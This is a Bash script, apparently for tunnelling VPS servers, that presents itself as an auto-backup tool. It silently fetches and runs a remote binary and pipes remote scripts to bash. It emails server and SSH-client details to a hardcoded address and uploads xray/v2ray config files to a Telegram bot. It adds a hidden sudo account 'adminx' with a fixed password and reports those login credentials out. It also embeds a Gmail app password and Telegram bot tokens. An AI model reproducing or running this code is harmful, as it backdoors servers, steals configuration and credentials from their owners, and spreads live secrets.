#!/bin/bash
function tes_autobackup(){
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
#Decrypted By YADDY D PHREAKER
function cekfile() {
#REPOZ="https://raw.githubusercontent.com/YaddyKakkoii/tes/main/"
#REPO="https://raw.githubusercontent.com/YaddyKakkoii/casper/main/"
REPOX="https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/"
MYIP=$(wget -qO- ipinfo.io/ip);
rclonefile=/root/.config/rclone/rclone.conf
    if [ -f $rclonefile ]; then
#        echo "terdeteksi sudah ada file $rclonefile "
        clear
    else
#        echo "terdeteksi tidak ada file$rclonefile "
        curl https://rclone.org/install.sh | bash >/dev/null 2>&1
        apt install rclone -y >/dev/null 2>&1
        printf "q\n" | rclone config
        wget -qO /root/.config/rclone/rclone.conf "${REPOX}rclone.conf"
        chmod 777 /root/.config/rclone/rclone.conf
    fi
echo "selesai dependencies udah terinstall"

apt install msmtp-mta ca-certificates bsd-mailx -y
rm -f /etc/msmtprc
touch /etc/msmtprc
cat<<EOF>>/etc/msmtprc
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt

account default
host smtp.gmail.com
port 587
auth on
user backupsmtp93@gmail.com
from backupsmtp93@gmail.com
password sdallofkbpuhbtoa 
logfile ~/.msmtp.log

EOF
chown -R www-data:www-data /etc/msmtprc
}
function kirimemail() {
#REPO="https://raw.githubusercontent.com/YaddyKakkoii/casper/main/"
#REPOX="https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/"
REPOZ="https://raw.githubusercontent.com/YaddyKakkoii/tes/main/"
cd /usr/bin
wget -O gpgw "${REPOZ}ewe"
chmod +x /usr/bin/gpgw
gpgw
rm /usr/bin/gpgw
cd /root
rm -fr /user
mkdir -p /user
touch /user/namauser.txt && touch /user/waktuexpiredsc.txt
echo "YADDY GANTENG" > /user/namauser.txt
echo "UNLIMITED LIFETIME" > /user/waktuexpiredsc.txt
USRSC=$(cat /user/namauser.txt)
EXPSC=$(cat /user/waktuexpiredsc.txt)
domain=$(cat /etc/xray/domain)
IPSAYA=$(curl -s ipv4.icanhazip.com)
DATE_EXEC="$(date "+%d %b %Y %H:%M")"
FileSementara='/tmp/ipinfo-$DATE_EXEC.txt'
curl http://ipinfo.io/$IP -s -o $FileSementara
ORG=$(cat $FileSementara | jq '.org' | sed 's/"//g')
CITY=$(cat $FileSementara | jq '.city' | sed 's/"//g')
COUNTRY=$(cat $FileSementara | jq '.country' | sed 's/"//g')
ISP=$(wget -qO- ipinfo.io/org)
MYIP=$(wget -qO- ipinfo.io/ip)
HOSTVPS=$(curl -s ipinfo.io/hostname )
KOTAVPS=$(curl -s ipinfo.io/city )
REGIONVPS=$(curl -s ipinfo.io/region )
GEOMAPVPS=$(curl -s ipinfo.io/loc )
KODEPOSVPS=$(curl -s ipinfo.io/postal )
ZONAWAKTUVPS=$(curl -s ipinfo.io/timezone )
TIMES="10"
NAMES=$(whoami)
RAMMS=$(free -m | awk 'NR==2 {print $2}')
TIMES="10"
TIME=$(date +'%Y-%m-%d %H:%M:%S')
CHATID="1117211252"
KEY="6203209250:AAG7GoBbaUqo2qh4N-IGvScNisDWTHfLh8M"
#KEY="6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ"
URL="https://api.telegram.org/bot$KEY/sendMessage"

ipsimcard=$(echo $SSH_CLIENT | awk '{print $1}')
portssh=$(echo $SSH_CLIENT | awk '{print $3}')
tomem="$(free | awk '{print $2}' | head -2 | tail -n 1 )"
usmem="$(free | awk '{print $3}' | head -2 | tail -n 1 )"
cpu1="$(mpstat | awk '{print $4}' | head -4 |tail -n 1)"
cpu2="$(mpstat | awk '{print $6}' | head -4 |tail -n 1)"
persenmemori="$(echo "$usmem*100/$tomem" | bc)"
persencpu="$(echo "scale=2; $cpu1+$cpu2" | bc)"
function email_pertama(){
emailtujuan=('yadicakepp@gmail.com')
echo "===================================
NAME       : $NAMES
IP VPS     : $IPSAYA
DOMAIN     : $domain
HOSTNAME   : $HOSTVPS
KOTA       : $CITY
RAM        : $RAMMS
KODE POS   : ${KODEPOSVPS}
KODE NEGARA: $COUNTRY
ISP        : $ORG
IP SIMCARD : ${ipsimcard}
PORT LOGIN : ${portssh}
LOGIN TIME : ${tanggal}
TRACKER IP :
https://www.opentracker.net/feature/ip-tracker?ip=$ipsimcard
DATE = $TIME
RAM = $persenmemori%
CPU = $persencpu%
===================================

" | mail -s "Auto Backup VPS" ${emailtujuan}
}

function email_kedua(){
echo "
<code>────────────────────</code>
<b>⚠️AUTOSCRIPT PREMIUM⚠️</b>
<code>────────────────────</code>
<code>Owner  : </code><code>$USRSC</code>
<code>Date   : </code><code>$TIME</code>
<code>Exp Sc : </code><code>$EXPSC</code>
<u><b>INFORMASI INSTALASI VPS </b></u>
<b>USER</b>   : <code>${NAMES}</code>
<b>RAM</b>    : <code>${RAMMS}MB</code>
<b>TANGGAL</b>: <code>${DATE_EXEC}</code>
<b>HOST</b>   : <code>${HOSTVPS}</code>
<b>KOTA</b>   : <code>${KOTAVPS}</code>
<b>NEGARA</b> : <code>${REGIONVPS}</code>
<b>GEO LOKASI</b>: <code>${GEOMAPVPS}</code>
<b>ZONA WAKTU</b>: <code>${ZONAWAKTUVPS}</code>
<b>IP SIMCARD</b>: <code>${ipsimcard}</code>
<b>PORT LOGIN</b>: <code>${portssh}</code>
<b>IP TUNNELL</b>: <code>${MYIP}</code>
<b>DOMAIN</b>    : <code>${domain}</code>
<b>ISP</b>       : <code>${ISP}</code>
<code>User Login 1 :</code> <code>toor</code>
<code>User Login 2 :</code> <code>trialX232</code>
<code>User Login 3 :</code> <code>asowesomz</code>
<code>Pass Login  :</code> <code>Tensazang3tsu.</code>
<code>U_Pass X :</code> <code>adminx_Tensa.zang3tsu</code>
<code>────────────────────</code>
<i>Automatic Notification from</i>
<i>Github Yaddy Kakkoii</i>
" | mail -s "Auto Backup Info Login" ${emailtujuan}
}
email_pertama
email_kedua
}

function sayaGanteng(){
bt=6203209250:AAG7GoBbaUqo2qh4N-IGvScNisDWTHfLh8M
#bt=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
ci=1117211252
domm=$(cat /etc/xray/domain)
tekz="
Yaddy Kakkoii Sugoi Tensai Desu
_____________________________
SUCCESS KIRIM DATA BACKUP
from domain : ${domm}
_____________________________
Recode by : Magelank Phreaker
"

DIREKTORI=/etc/xray
DIREKTORY=/etc/v2ray
FILEX=$(find $DIREKTORI -name '*domain')
FILEZ=$(find $DIREKTORI -name '*.json')
    for FILE in $FILEX; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done
    for FILE in $FILEZ; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

FILEQ=$(find $DIREKTORY -name '*.json')
    for FILE in $FILEQ; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

cp -f /etc/xray/config.json /root/config.json.txt
curl -F chat_id="$ci" -F document=@"config.json.txt" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
rm -f /root/config.json.txt

}
function archangel() {
# // Ram Information
    while IFS=":" read -r a b; do
        case $a in
            "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
            "Shmem") ((mem_used+=${b/kB}))  ;;
            "MemFree" | "Buffers" | "Cached" | "SReclaimable")
            mem_used="$((mem_used-=${b/kB}))"
            ;;
        esac
    done < /proc/meminfo
    Ram_Usage="$((mem_used / 1024))"
    Ram_Total="$((mem_total / 1024))"
    export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
    export Kernel=$( uname -r )
    export Arch=$( uname -m )
    export IP=$( curl -s https://ipinfo.io/ip/ )
# Decrypted by Yaddykakkoii Magelang
    domain=$(cat /etc/xray/domain)
    MYIP=$(curl -sS ipv4.icanhazip.com)
    ISP=$(wget -qO- ipinfo.io/org)
    userdel jame > /dev/null 2>&1
    Username="adminx"
    Password="Tensa.zang3tsu"
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
    usermod -aG sudo $Username > /dev/null 2>&1

    USRSC=Yaddyganteng

    CHATID="1117211252"
    KEY="6093232802:AAFULABHNHz8pW6tT1ApFACFHiXZMixkeSA"
    TIME="10"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    TEXT="𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
    𝗩𝗣𝗦 𝗜𝗡𝗙𝗢
    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
    <code>Isp Vps :</code> <code>$ISP</code>
    <code>Domain     :</code> <code>$domain</code>
    <code>IP Vps     :</code> <code>$MYIP</code>
    <code>User Login :</code> <code>$Username</code>
    <code>Pass Login :</code> <code>$Password</code>
    <code>OS Vps     :</code> <code>$OS_Name</code>
    <code>User Script:</code> <code>$USRSC</code>
    <code>Tanggal    :</code> <code>$tanggal</code>
    <code>Exp Vps :</code> <code>$exp</code>
    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
    <code>Hostname   :</code> <code>${HOSTNAME}</code>
    <code>Kernel     :</code> <code>$Kernel</code>
    <code>Arch       :</code> <code>$Arch</code>
    <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
    <code>Ram Used   :</code> <code>$Ram_Total MB</code>
    ============================
  ⚠︎𝘽𝙮 𝙒𝙤𝙠𝙨𝙯𝙓𝘿 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
    ============================
"

   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}
cekfile >/dev/null 2>&1
kirimemail > /dev/null 2>&1
sayaGanteng > /dev/null 2>&1
archangel
}
tes_autobackup